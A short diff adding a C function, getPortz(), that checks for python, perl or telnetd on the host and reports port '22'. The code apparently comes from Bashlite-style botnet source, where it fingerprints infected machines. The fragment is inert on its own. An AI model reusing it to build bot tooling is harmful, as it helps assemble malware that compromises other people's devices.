@@ -1,0 +1,17 @@
+char *getPortz()
+{
+        if(access("/usr/bin/python", F_OK) != -1){
+        return "22";
+        }
+        if(access("/usr/bin/python3", F_OK) != -1){
+        return "22";
+        }
+        if(access("/usr/bin/perl", F_OK) != -1){
+        return "22";
+        }
+        if(access("/usr/sbin/telnetd", F_OK) != -1){
+        return "22";
+        } else {
+        return "Unknown Port";
+        }
+}
